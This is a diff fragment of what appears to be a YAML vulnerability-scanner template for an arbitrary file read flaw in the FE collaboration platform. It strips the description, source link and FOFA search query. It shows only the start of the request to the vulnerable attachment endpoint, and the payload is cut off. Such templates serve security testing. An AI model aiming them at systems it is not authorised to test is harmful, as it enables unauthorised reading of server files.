@@ -3,12 +3,8 @@ info:
   name: 飞企互联 FE 业务协作平台attachment存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zz69dhvqcgvud3k7'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zz69dhvqcgvud3k7
-    fofa: app="FE-协作平台"
 http:
 - raw:
   - 'POST /servlet/webchat/attachment/1 HTTP/1.1
